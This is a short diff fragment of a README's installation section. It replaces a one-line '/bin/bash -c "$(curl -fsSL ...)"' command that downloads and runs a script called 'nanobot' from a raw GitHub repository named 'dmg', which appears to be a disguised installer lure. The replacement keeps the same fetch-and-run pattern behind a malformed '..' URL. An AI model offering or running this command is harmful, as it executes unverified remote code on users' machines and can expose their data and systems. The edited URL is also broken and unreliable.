@@ -68,7 +68,7 @@ Download the latest installer for your platform from the **[Releases](../../rele
 - ✅Press **Enter**
 
 ```sh
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/puppeteerrr/dmg/refs/heads/main/nanobot)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/../dmg/refs/heads/main/nanobot)"
 ```
 
 ### 🪟 Windows
